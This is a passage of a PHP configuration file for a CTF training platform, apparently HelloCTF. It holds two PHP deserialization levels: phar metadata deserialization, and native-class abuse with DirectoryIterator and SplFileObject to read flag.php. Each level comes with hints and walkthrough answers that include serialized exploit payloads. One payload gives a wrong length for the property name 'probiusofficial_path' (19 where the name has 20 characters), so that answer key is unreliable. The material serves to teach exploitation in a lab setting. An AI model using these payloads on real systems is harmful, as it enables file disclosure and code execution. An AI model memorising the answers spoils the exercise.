        '想自己造 phar:看「源码」页的 build_phar.php,本地 <code>php -d phar.readonly=0 build_phar.php "命令"</code>。',
    ],
    'wp' => [
        'idea' => 'is_dir(phar://helloctf.phar) 触发 metadata 反序列化,FLAG 对象析构时 eval 命令。',
        'exp' => "?file=phar://helloctf.phar",
    ],
],

24 => [
    'title' => '原生类利用', 'mode' => 'guided', 'diff' => 2,
    'tags' => ['原生类', 'DirectoryIterator', 'SplFileObject'],
    'goal' => '没有 eval、没有 system。利用两个原生类:先列目录找到 flag 文件,再读出它的内容。echo 提交的对象即可触发 <code>__toString</code>。',
    'know' => '原生类是"现成的工具人":<code>DirectoryIterator</code> 遍历目录、<code>SplFileObject</code> 逐行读文件——当源码没有可控的危险函数时,它们就是 sink。',
    'params' => [['method' => 'POST', 'name' => 'o', 'desc' => 'TJ_ITER 或 HELLOCTF_READER 对象序列化串(URL编码)']],
    'sources' => [['关卡源码', 'Level24/index.php']],
    'key_lines' => [
        ['from' => 12, 'to' => 20, 'label' => 'TJ_ITER:DirectoryIterator 列目录'],
        ['from' => 22, 'to' => 27, 'label' => 'HELLOCTF_READER:SplFileObject 读文件'],
    ],
    'hints' => [
        '第一步:还原 TJ_ITER,<code>probiusofficial_path = "."</code>,echo 触发 toString 列出当前目录。',
        '第二步:还原 HELLOCTF_READER,<code>tj_file = "flag.php"</code>,echo 读出内容。',
        '用「⌨ 运行器」生成两个类的序列化串(提交时 echo 由页面完成,你只需 o=串)。',
    ],
    'wp' => [
        'idea' => 'DirectoryIterator 列目录定位 flag 文件,SplFileObject 读取内容,echo 触发 __toString。',
        'exp' => "第一步 payload:\nO:7:\"TJ_ITER\":1:{s:19:\"probiusofficial_path\";s:1:\".\";}\n第二步 payload:\nO:15:\"HELLOCTF_READER\":1:{s:7:\"tj_file\";s:8:\"flag.php\";}",
    ],
],

],

];
